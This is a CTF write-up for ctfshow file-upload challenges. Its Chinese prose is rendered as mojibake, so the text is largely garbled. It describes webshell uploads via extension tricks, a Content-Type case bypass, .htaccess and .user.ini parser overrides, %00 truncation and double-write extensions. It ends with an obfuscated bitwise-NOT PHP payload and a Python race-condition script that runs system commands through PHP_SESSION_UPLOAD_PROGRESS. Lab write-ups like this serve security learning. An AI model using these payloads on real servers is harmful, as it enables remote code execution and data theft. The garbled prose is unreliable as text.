---
uuid: c4a9a981-05ea-64ec-fa7c-7b71320fd3ae
title: ctfshowæ–‡ä»¶ä¸Šä¼ 
date: 2022-02-08 18:43:54
tags:
      - bugctf
      - CTF
      - Web
categories: 
       - [Web]
       - [CTF]
---

æ–‡ä»¶ä¸Šä¼ é¢˜å‹
<!--more-->

# æ–‡ä»¶ä¸Šä¼ 1--å›¾ç‰‡é©¬ä¸Šä¼ 

![image-20220208184616805](https://img-blog.csdnimg.cn/img_convert/44d4509d24bfbb31e78d0206fef19b49.png)

![image-20220208184653016](https://img-blog.csdnimg.cn/img_convert/404fc0b3d659d1cad6dfa26d56c491cf.png)

ç›´æ¥ä¸Šä¼ ä¸€å¥è¯å‘ç°ä¸è¡Œï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡ï¼Œé‚£å°±åˆ¶ä½œå›¾ç‰‡é©¬ä¸Šä¼ å§ï¼

![image-20220208184858927](https://img-blog.csdnimg.cn/img_convert/b093fdb2f10746ae3910281dc3a7c558.png)

ä½†æ˜¯å‘ç°è¿˜æ˜¯ä¸èƒ½æ­£å¸¸ä¸Šä¼ ï¼Œè¿™å°±è¯¥è€ƒè™‘æ˜¯ä¸æ˜¯è¿‡æ»¤äº†ï¼Œå°è¯•å°†phpæ”¹ä¸ºphp3.4.5æˆ–è€…phtmlè¯•è¯•

![image-20220208185100735](https://img-blog.csdnimg.cn/img_convert/c95eeeb51c74f607b5819a622fad9b35.png)

æ”¾ä¸€ä¸ªå›¾å§ï¼Œè¿™å‘ç°è¿˜æ˜¯ä¸è¡Œã€‚è¿™ä¸ªæ—¶å€™å°±åº”è¯¥è€ƒè™‘åº”è¯¥æ˜¯Content-Type: multipart/form-dataè¢«æ‹¦æˆªï¼Œè¿™ä¸ªæ˜¯æœ‰è§£å†³åŠæ³•çš„ï¼Œstrpos()åŒºåˆ†å¤§å°å†™ï¼Œä½¿ç”¨å¤§å†™ç»•è¿‡å³å¯

![image-20220208185355163](https://img-blog.csdnimg.cn/img_convert/91d56f1cd515922500c99aba5bf0512c.png)

è¿™ä¸ªæ—¶å€™å‘ç°ä¾ç„¶ä¸è¡Œï¼Œé‚£åº”è¯¥å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ ¼å¼é¡µæœ‰é»‘åå•ï¼Œé‚£æŠŠphpæ”¹æˆphp4è¯•è¯•(php3å’Œphp5éƒ½è¯•äº†ï¼Œå‘ç°ä¸è¡Œ)

![image-20220208185459783](https://img-blog.csdnimg.cn/img_convert/c6db479da059d6f8d7dbb109f417ec6e.png)

è¿™ä¸ªæ—¶å€™å‘ç°ç»ˆäºå¯ä»¥ä¸Šä¼ äº†ã€‚

ç„¶åä¸Šèšå‰‘shellï¼Œå³å¯é¡ºåˆ©å¾—åˆ°flag!

# æ–‡ä»¶ä¸Šä¼ 2--ä¸éœ€è¦éªŒè¯

è¿™ç±»é¢˜å‹æ¯”è¾ƒç®€å•ï¼

![image-20220213092711909](https://img-blog.csdnimg.cn/img_convert/b46bbc9e601b96776fb0a2f775cd8d71.png)

ç›´æ¥ä¸Šä¼ ä¸€å¥è¯ç„¶åèšå‰‘è¿æ¥å°±å¯ï¼![image-20220213092746633](https://img-blog.csdnimg.cn/img_convert/8f8d72b9a0d9e8ce97a906b66824638d.png)

![image-20220213092907477](https://img-blog.csdnimg.cn/img_convert/aa35cf8ea67374cddd7bc23d7883fa0e.png)

# æ–‡ä»¶ä¸Šä¼ 3--åˆæ­¥çš„å‰ç«¯éªŒè¯

![image-20220213094222453](https://img-blog.csdnimg.cn/img_convert/146ddb8cc158e6e10d4cb90fd7bf25df.png)

è¿™ä¸ªæ—¶å€™å†ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬å°±ä¸å¯ä»¥äº†ï¼Œéœ€è¦ä¸Šä¼ å›¾ç‰‡é©¬æ¥è¿›è¡Œç»•è¿‡å‰ç«¯éªŒè¯ï¼bpæŠ“åŒ…æ”¹åç¼€![image-20220213094425933](https://img-blog.csdnimg.cn/img_convert/18f8c36b78ebbbbf0c9b24b206fc98a0.png)

![image-20220213095256115](https://img-blog.csdnimg.cn/img_convert/18bd58921a30a5a96472da395a5b3e73.png)

æˆåŠŸä¸Šä¼ ï¼Œç„¶åèšå‰‘è¿æ¥ï¼Œå¾—åˆ°flagï¼

# æ–‡ä»¶ä¸Šä¼ 4--æ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡

![image-20220213095639275](https://img-blog.csdnimg.cn/img_convert/863985a9bca47467ec94e1bf971a3a09.png)

é¦–å…ˆå…ˆbpæŠ“åŒ…ä¸Šä¼ å›¾ç‰‡é©¬è¯•è¯•![image-20220213095944411](https://img-blog.csdnimg.cn/img_convert/16e2c42eb0b0d7e028fc53c145488939.png)

å‘ç°å¯ä»¥æ­£å¸¸ä¸Šä¼ ï¼Œé‚£ç”¨èšå‰‘è¿æ¥çœ‹ä¸€ä¸‹![image-20220213100041277](https://img-blog.csdnimg.cn/img_convert/211240fb4ac22fb7abcf30c5a50e6055.png)

å‘ç°å¯ä»¥æ­£å¸¸è¿æ¥ï¼æ‰¾åˆ°flagæäº¤å³å¯ï¼

è¿™é‡Œæœ‰å¿…è¦è§£é‡Šä¸€ä¸‹ï¼Œå› ä¸ºè¿™ä¸ªé¢˜è€ƒå¯Ÿçš„æ˜¯æ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡ï¼Œä½†æ˜¯ä¸ºå•¥æˆ‘åšçš„è¿™ä¹ˆç›´æ¥å‘¢ï¼Œè¿™ä¸ªé¢˜æœ‰å¾ˆå¤šç§è§£æ³•ï¼Œæˆ‘è¿™ä¸ªæ˜¯ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œæ‰€ä»¥æ–‡ä»¶å¤´Content-typeå°±æ˜¯image/pngï¼Œä¸éœ€è¦åšä»»ä½•æ›´æ”¹å°±å¯ä»¥ä¸Šä¼ ã€‚

è¿˜æœ‰ä¸€ç§è§£æ³•å°±æ˜¯å¾—éœ€è¦ä¿®æ”¹æ–‡ä»¶å¤´ï¼Œé‚£æ˜¯å› ä¸ºä¸Šä¼ çš„æ˜¯phpæ–‡ä»¶çš„ä¸€å¥è¯ï¼Œè¿™ä¸ªæ—¶å€™Content-typeå°±ä¸æ˜¯image/pngäº†ï¼Œå¦‚æœä¸ä¿®æ”¹æ–‡ä»¶å¤´å°±æ²¡æœ‰åŠæ³•æ­£å¸¸ä¸Šä¼ ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±ä¼šä¿®æ”¹ä¸ºimage.png,ä¾æ¬¡ç»•è¿‡ï¼ŒæˆåŠŸä¸Šä¼ ï¼

# æ–‡ä»¶ä¸Šä¼ 5--MIMEç»•è¿‡

![image-20220213100857098](https://img-blog.csdnimg.cn/img_convert/2678614f4f23bde83edb1d27db2a1426.png)

è¿˜æ˜¯å…ˆä¸Šä¼ ä¸ªå›¾ç‰‡é©¬ï¼ŒbpæŠ“åŒ…çœ‹çœ‹ï¼

![image-20220213100848241](https://img-blog.csdnimg.cn/img_convert/405da36697ede869554402dddc094fe3.png)

è¿™ä¸ªæ—¶å€™å‘ç°ä¿®æ”¹ä¸€ä¸‹åç¼€è¿˜æ˜¯å¯ä»¥æ­£å¸¸ä¸Šä¼ çš„ï¼Œè«éç›´æ¥èšå‰‘åˆå¯ä»¥ç›´æ¥è§£å‡ºæ¥ï¼Ÿï¼Ÿï¼Ÿï¼Ÿè¯•è¯•ï¼![image-20220213101044425](https://img-blog.csdnimg.cn/img_convert/4291c24bfbb53ce346ffaa138b712e8a.png)

emmmï¼Œè¿™è®©æˆ‘å’‹è¯´ï¼Œåˆæ˜¯æ­£å¸¸ç›´æ¥è¿æ¥ï¼Œå®³ï¼çœ‹æ¥ä¸èƒ½å…‰åšé¢˜äº†ï¼Œäº†è§£ä¸€ä¸‹MIMEç»•è¿‡å§ï¼

MIME(multipurpose Internet mail extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚![img](https://img-blog.csdnimg.cn/img_convert/6d29e33d4d6770f4139852ce12c4f84a.png)

æˆ‘çœ‹åˆ°ç½‘ä¸Šçš„wpéƒ½æ˜¯éœ€è¦ä¿®æ”¹ä¸€ä¸‹æ–‡ä»¶ç±»å‹ï¼ä½†æ˜¯æˆ‘è¿™åˆæ˜¯ä¸ç”¨ä¿®æ”¹å°±é»˜è®¤æ˜¯image/pngï¼Œåº”è¯¥ä¹Ÿæ˜¯å› ä¸ºæˆ‘ä¸Šä¼ å›¾ç‰‡é©¬çš„ç¼˜æ•…å§ï¼æˆ‘åªèƒ½è¯´å›¾ç‰‡é©¬yydsï¼

# æ–‡ä»¶ä¸Šä¼ 6--.htaccess

htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚



![image-20220213101632834](https://img-blog.csdnimg.cn/img_convert/9873b4028ea4a24f77317c7cf1f813a1.png)

![image-20220213101839062](https://img-blog.csdnimg.cn/img_convert/7332620935aaae5e29b2b21600d65df9.png)

ç»ˆäºä¸åƒå‰å‡ é¢˜é‚£æ ·å¦‚æ­¤æ•·è¡äº†ï¼Œè¿™æ¬¡æ²¡æœ‰æˆåŠŸä¸Šä¼ äº†ï¼é€šè¿‡ä»£ç å‘ç°æœ‰é»‘åå•ï¼ŒæŠŠå¥½å¤šåç¼€éƒ½æ‹‰é»‘äº†ï¼![image-20220213102005201](https://img-blog.csdnimg.cn/img_convert/ce89134d3fb85a3274929d63198dda80.png)

äº†è§£äº†ä¸€ä¸‹htaccessæ–‡ä»¶çš„ç‰¹ç‚¹ï¼Œè¿™ä¸ªé¢˜å¯ä»¥é‡å†™æ–‡ä»¶çš„è§£æè§„åˆ™æ¥ç»•è¿‡ï¼Œå…·ä½“æ­¥éª¤å°±æ˜¯å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ï¼ŒæŠŠä¹‹å‰çš„æ–‡ä»¶æ›¿æ¢æ‰ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š

```
SetHandler application/x-httpd-php
```

æ–‡ä»¶å†…å®¹æ˜¯è¿™ä¸ªï¼Œæ„æ€å°±æ˜¯å°†ä¸Šä¼ çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æï¼

ä¸Šä¼ å¥½è¿™ä¸ªæ–‡ä»¶ä¹‹åå†ä¸Šä¼ å›¾ç‰‡é©¬ç„¶åç›´æ¥èšå‰‘è¿æ¥å³å¯ï¼!

> ï¼ˆåœ¨è¿™é‡Œæˆ‘èµ°è¿‡å¼¯è·¯ï¼Œæˆ‘ä»¥ä¸ºå†ä¸Šä¼ å›¾ç‰‡é©¬çš„æ—¶å€™è¿˜æ˜¯éœ€è¦åƒä¹‹å‰é‚£æ ·bpæŠ“åŒ…æ”¹åç¼€ï¼Œç»“æœèšå‰‘ä¸€ç›´éƒ½è¿ä¸ä¸Šï¼Œç°åœ¨å†å›æƒ³ä¸€ä¸‹ï¼Œå‘ç°.htaccessæ–‡ä»¶å·²ç»èµ·åˆ°äº†è¿™ä¸ªä½œç”¨ï¼Œä¸éœ€è¦å†æ¢åç¼€äº†ï¼‰

![image-20220215205204866](https://img-blog.csdnimg.cn/img_convert/5b5bae3ce24233dd5461ebed4beaa7a9.png)

# æ–‡ä»¶ä¸Šä¼ 7-- 00æˆªæ–­

![image-20220215113637612](https://img-blog.csdnimg.cn/img_convert/69a9335a405777ee81cbb7e29239623b.png)

![image-20220215113733831](https://img-blog.csdnimg.cn/img_convert/9b8ff85930d93e9739a9ea0beb78f49d.png)

æ­£å¸¸ä¸Šä¼ å›¾ç‰‡é©¬åå‘ç°å¹¶ä¸èƒ½é€šè¿‡ï¼Œè¿™ä¸ªæ—¶å€™å‘ç°æœ‰ç™½åå•ç»•è¿‡

```
   $whitelist = array("jpg", "png", "gif");
```

é‰´äºè¿™ä¸ªé¢˜æ˜¯è€ƒå¯Ÿ00æˆªæ–­ï¼ŒæœæŸ¥èµ„æ–™å‘ç°00æˆªæ–­ä¸€èˆ¬éƒ½æ˜¯åœ¨ä¸Šä¼ è·¯å¾„æˆªæ–­ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚è¿æ¥å¤„åŒ…å«roadå‚æ•°![image-20220215114956967](https://img-blog.csdnimg.cn/img_convert/f9024a85675fc89523133da555297538.png)

![image-20220215222344049](https://img-blog.csdnimg.cn/img_convert/d052a507d2f335ee4d29dd099b77ff9d.png)

æŠŠè¿™ä¸ªå‚æ•°å†…å®¹ä¿®æ”¹ä¸º`/var/www/html/upload/muma.php%00`ï¼Œç„¶åèšå‰‘è¿æ¥å¾—åˆ°flagï¼![image-20220215222736575](https://img-blog.csdnimg.cn/img_convert/6620af75de7e94451ce788a32b59bc6d.png)

# æ–‡ä»¶ä¸Šä¼ 8--åŒå†™åç¼€

![image-20220215212331181](https://img-blog.csdnimg.cn/img_convert/002dfcbef1ad8e073593e57cc237aff5.png)

```
åŒå†™åç¼€ç»•è¿‡ç”¨äºåªå°†æ–‡ä»¶åç¼€åï¼Œä¾‹å¦‚"php"å­—ç¬¦ä¸²è¿‡æ»¤çš„åœºåˆï¼›
ä¾‹å¦‚:ä¸Šä¼ æ—¶å°†Burpsuiteæˆªè·çš„æ•°æ®åŒ…ä¸­æ–‡ä»¶åã€evil.phpã€‘æ”¹ä¸ºã€evil.pphphpã€‘ï¼Œé‚£ä¹ˆè¿‡æ»¤äº†ç¬¬ä¸€ä¸ª"php"å­—ç¬¦ä¸²"åï¼Œå¼€å¤´çš„'p'å’Œç»“å°¾çš„'hp'å°±ç»„åˆåˆå½¢æˆäº†ã€phpã€‘ã€‚
```

![img](https://img-blog.csdnimg.cn/img_convert/59a8e50bc958f8f4ee82b051f177550d.png)

ä¸Šä¼ ä¹‹åè¿™æ ·ä¿®æ”¹ä¹‹åå‘é€æ•°æ®åŒ…ï¼Œç„¶åèšå‰‘è¿æ¥ï¼Œå¾—åˆ°flagï¼![image-20220215212536157](https://img-blog.csdnimg.cn/img_convert/a5e889c11e631bd18a51b61655c78c4b.png)

# æ–‡ä»¶ä¸Šä¼ 9--å‰ç«¯éªŒè¯

![image-20220206165932472](https://img-blog.csdnimg.cn/img_convert/9ce8fe3bff1e9d904eecdaa77ff38487.png)

è¿™ä¸ªé¢˜è¯´äº†ä¸Šä¼ å›¾ç‰‡ï¼Œæ‰€ä»¥phpçš„ä¸€å¥æœ¨é©¬åº”è¯¥ä¸Šä¼ ä¸äº†ï¼Œåˆæˆä¸€ä¸‹å›¾ç‰‡æœ¨é©¬ä¸Šä¼ ä¸€ä¸‹ï¼

ä½†æ˜¯ä¸Šä¼ æˆåŠŸä¹‹åå‘ç°èšå‰‘è¿˜æ˜¯æ²¡æœ‰åŠæ³•è¿æ¥ï¼Œè¿™ä¸ªæ—¶å€™é¦–å…ˆè€ƒè™‘åˆ°çš„æ˜¯å‰ç«¯éªŒè¯å¯¼è‡´çš„ï¼ŒbpæŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹åç¼€ï¼ŒæŠŠpngä¿®æ”¹æˆphp,ç„¶åèšå‰‘è¿æ¥æˆåŠŸï¼Œå¾—åˆ°flagï¼Œæ”¾å›¾

![image-20220206170213732](https://img-blog.csdnimg.cn/img_convert/5d31793bdc53189f16fae0c1ea612391.png)

![image-20220206170225325](https://img-blog.csdnimg.cn/img_convert/9a442b12e1bde01036691be022cba313.png)

è¿™é“é¢˜åªæ˜¯ç®€å•çš„å‰ç«¯éªŒè¯ï¼Œè§£é¢˜æ­¥éª¤ä¹Ÿå°±æ˜¯è¿™æ ·ï¼

# æ–‡ä»¶ä¸Šä¼ 10--åç«¯æ ¡éªŒ

è¿™ä¸ªé¢˜æ²¡å•¥è¯´çš„ï¼Œæ€è·¯å’Œ151ä¸€æ ·ï¼Œå°±ä¸è¯´äº†





----------------------------------------------------------------------------------------åˆ†å‰²çº¿--------------------------------------------------------------------------------------

ä¸Šé¢æ˜¯ä¹‹å‰åˆ·é¢˜çš„è®°å½•ï¼Œè¿™é‡Œä»ctfshowçš„web162å¼€å§‹åˆ·

# web162

è¿™é“é¢˜ç›®ä¹Ÿæ˜¯ä¸Šä¼ .user.iniä¹‹åå†ä¸Šä¼ å›¾ç‰‡ğŸ

è¿™é“é¢˜æ— éå°±æ˜¯æŠŠç‚¹ç»™è¿‡æ»¤äº†ï¼Œåªéœ€è¦ä¸Šä¼ çš„ğŸä¸å¸¦ç‚¹å³å¯

.user.ini

```
GIF89a

auto_prepend_file=png
```

png

```
GIF89a
<?=require~%9b%9e%8b%9e%c5%d0%d0%8b%9a%87%8b%d0%8f%93%9e%96%91%d3%c3%c0%8f%97%8f%df%8c%86%8c%8b%9a%92%d7%d8%8b%9e%9c%df%d1%d1%d0%99%d5%d8%d6%c4%c0%c1?>
```

é‡‡ç”¨å–å

```
<?php
$a = "data://text/plain,<?php system('tac ../f*');?>";
echo "~(";
for ($i = 0; $i < strlen($a); $i++) {
    echo "%".bin2hex(~$a[$i]);
}
echo ")";

```

è„šæœ¬å®ç°å¦‚ä¸‹

```
import requests
import threading

rs = requests.session()
sess = 'hahaha'
url = "https://7129a574-6701-4301-b099-512ab7f25342.challenge.ctf.show/"
data = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../f*");?>'
}
file = {
    'file': sess
}
cookie = {
    'PHPSESSID': sess
}


def write():
    while True:
        rs.post(url, data=data, files=file, cookies=cookie)


def read():
    while True:
        r = rs.get(url + "/upload/index.php")
        if 'flag' in r.text or 'ctfshow' in r.text:
            print(r.text)
            exit()


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()


```

